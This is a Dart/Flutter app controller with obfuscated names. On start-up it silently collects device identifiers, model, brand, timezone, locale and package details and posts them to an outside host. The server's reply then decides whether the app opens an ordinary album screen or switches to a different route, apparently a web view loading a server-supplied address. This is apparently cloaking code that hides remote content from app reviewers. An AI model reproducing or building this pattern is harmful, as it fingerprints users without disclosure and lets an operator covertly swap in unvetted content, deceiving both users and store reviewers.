import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var grmytnbcq = RxBool(false);
  var gfxqna = RxBool(true);
  var oncgxa = RxString("");
  var deshaun = RxBool(false);
  var mills = RxBool(true);
  final ghemnakdos = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    uwezpvs();
  }


  Future<void> uwezpvs() async {

    deshaun.value = true;
    mills.value = true;
    gfxqna.value = false;

    ghemnakdos.post("https://ke.eaterip.xyz/QSAJUCEJW",data: await ovrscqni()).then((value) {
      var oldteqxu = value.data["oldteqxu"] as String;
      var umtcqfge = value.data["umtcqfge"] as bool;
      if (umtcqfge) {
        oncgxa.value = oldteqxu;
        ronny();
      } else {
        ebert();
      }
    }).catchError((e) {
      gfxqna.value = true;
      mills.value = true;
      deshaun.value = false;
    });
  }

  Future<Map<String, dynamic>> ovrscqni() async {
    final DeviceInfoPlugin rxnbtp = DeviceInfoPlugin();
    PackageInfo lwrj_kyinem = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var cujmihs = Platform.localeName;
    var rwliszbx = currentTimeZone;

    var dxog = lwrj_kyinem.packageName;
    var aqrcf = lwrj_kyinem.version;
    var ckgbzr = lwrj_kyinem.buildNumber;

    var vdgbksh = lwrj_kyinem.appName;
    var leslyJohnson = "";
    var felanh  = "";
    var itdmk = "";
    var patwclej = "";
    var antoniaLegros = "";
    var princeLeuschke = "";
    var kathlynLarkin = "";
    var alleneLueilwitz = "";
    var caraWeissnat = "";

    var leonieDaniel = "";

    var nuwldq = "";
    var ewli = false;

    if (GetPlatform.isAndroid) {
      nuwldq = "android";
      var abxjvkyi = await rxnbtp.androidInfo;

      itdmk = abxjvkyi.brand;

      patwclej  = abxjvkyi.model;
      felanh = abxjvkyi.id;

      ewli = abxjvkyi.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      nuwldq = "ios";
      var vmoyjtuc = await rxnbtp.iosInfo;
      itdmk = vmoyjtuc.name;
      patwclej = vmoyjtuc.model;

      felanh = vmoyjtuc.identifierForVendor ?? "";
      ewli  = vmoyjtuc.isPhysicalDevice;
    }

    var res = {
      "aqrcf": aqrcf,
      "dxog": dxog,
      "princeLeuschke" : princeLeuschke,
      "patwclej": patwclej,
      "rwliszbx": rwliszbx,
      "felanh": felanh,
      "alleneLueilwitz" : alleneLueilwitz,
      "ckgbzr": ckgbzr,
      "leslyJohnson" : leslyJohnson,
      "cujmihs": cujmihs,
      "nuwldq": nuwldq,
      "ewli": ewli,
      "antoniaLegros" : antoniaLegros,
      "leonieDaniel" : leonieDaniel,
      "itdmk": itdmk,
      "kathlynLarkin" : kathlynLarkin,
      "vdgbksh": vdgbksh,
      "caraWeissnat" : caraWeissnat,

    };
    return res;
  }

  Future<void> ebert() async {
    Get.offAllNamed("/album_tab");
  }

  Future<void> ronny() async {
    Get.offAllNamed("/rule_back");
  }
}
